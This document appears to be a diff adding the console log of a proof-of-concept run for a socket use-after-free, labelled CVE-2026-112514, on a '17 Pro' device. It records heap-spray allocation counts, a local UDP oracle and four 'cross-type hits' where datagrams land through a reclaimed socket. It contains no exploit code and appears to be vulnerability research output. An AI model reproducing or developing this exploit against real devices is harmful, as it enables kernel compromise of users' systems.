@@ -1,0 +1,117 @@
+=== CVE-2026-112514 socket UAF trigger (17 Pro, hammer build) ===
+[*] oracle tcpinfo: idle r=0 len=112 load r=0 len=112 diffs: 24:f8->08 25:7d->7e 56:00->01 64:00->10
+[*] UDP datagram oracle listening on 127.0.0.1:8090
+[*] timer pool: 64 sockets with armed retransmit timers
+[*] ITER 0 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 20 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 40 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 60 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 80 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 100 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 120 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 140 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 160 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 180 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[!] ITER 188 precision/mix: *** CROSS-TYPE HIT: 1 datagram(s)/8192 byte(s) via a reclaimed dgram socket (hammer alloc=256, in flight at close 5/6) ***
+[*] ITER 200 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 200/2000  132.8 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=12MB
+[*] ITER 220 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 240 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 260 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 280 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 300 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 320 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 340 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 360 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[!] ITER 380 precision/mix: *** CROSS-TYPE HIT: 1 datagram(s)/8192 byte(s) via a reclaimed dgram socket (hammer alloc=5, in flight at close 5/6) ***
+[*] ITER 400 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] iter 400/2000  103.6 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=14MB
+[*] ITER 420 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 440 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 460 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 480 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 500 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 520 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 540 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 560 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 580 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 600 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 600/2000  96.5 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=15MB
+[*] ITER 620 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 640 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 660 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 680 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 700 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 720 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 740 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 760 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 780 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 800 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 800/2000  96.1 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=16MB
+[*] ITER 820 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 840 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 860 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 880 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 900 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 920 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 940 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[!] ITER 956 precision/mix: *** CROSS-TYPE HIT: 6 datagram(s)/49152 byte(s) via a reclaimed dgram socket (hammer alloc=13, in flight at close 0/6) ***
+[*] ITER 960 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 980 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1000 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 1000/2000  96.0 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=18MB
+[*] ITER 1020 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1040 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1060 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1080 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1100 precision/mix: hammer alloc=2, tcpPeerBytes=144 baseline=144
+[*] ITER 1120 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1140 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1160 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1180 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1200 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 1200/2000  97.3 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=19MB
+[*] ITER 1220 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1240 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1260 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1280 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1300 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 1320 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1340 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1360 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1380 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1400 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 1400/2000  96.9 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=21MB
+[*] ITER 1420 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[!] ITER 1429 precision/mix: *** CROSS-TYPE HIT: 6 datagram(s)/49152 byte(s) via a reclaimed dgram socket (hammer alloc=1, in flight at close 0/6) ***
+[*] ITER 1440 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 1460 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1480 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1500 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1520 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1540 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1560 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1580 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1600 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 1600/2000  96.6 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=29MB
+[*] ITER 1620 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1640 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 1660 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1680 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1700 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1720 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1740 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1760 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1780 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1800 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] iter 1800/2000  96.4 it/s  sends=0  afterClose(max)=0  nwMax=0  fds=230  footprint=24MB
+[*] ITER 1820 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1840 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1860 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1880 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1900 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1920 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1940 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[*] ITER 1960 precision/mix: hammer alloc=0, tcpPeerBytes=144 baseline=144
+[*] ITER 1980 precision/mix: hammer alloc=1, tcpPeerBytes=144 baseline=144
+[+] sockmix: 4 cross-type datagram hit(s), 4 total stale-write hit(s) in 2000 iterations
